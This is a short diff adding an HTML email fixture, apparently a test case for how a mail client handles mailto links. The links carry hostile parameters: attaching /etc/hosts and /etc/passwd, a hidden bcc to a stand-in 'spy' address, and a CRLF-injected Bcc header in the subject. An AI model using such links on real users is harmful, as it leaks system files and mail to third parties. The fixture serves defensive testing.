@@ -1,0 +1,9 @@
+From: Sender <sender@example.org>
+To: Reader <reader@example.com>
+Subject: Corpus message
+Date: Wed, 04 Nov 2026 10:00:00 +0000
+Message-ID: <html-link-mailto-parameters@corpus.test>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><head></head><body><a href="mailto:x@example.org?attach=/etc/hosts&bcc=spy@example.net&subject=hi&body=secret">one</a> <a href="mailto:x@example.org?attachment=file:///etc/passwd">two</a> <a href="mailto:?to=y@example.org&cc=z@example.net&subject=a%0d%0aBcc:%20spy@example.net">three</a></body></html>
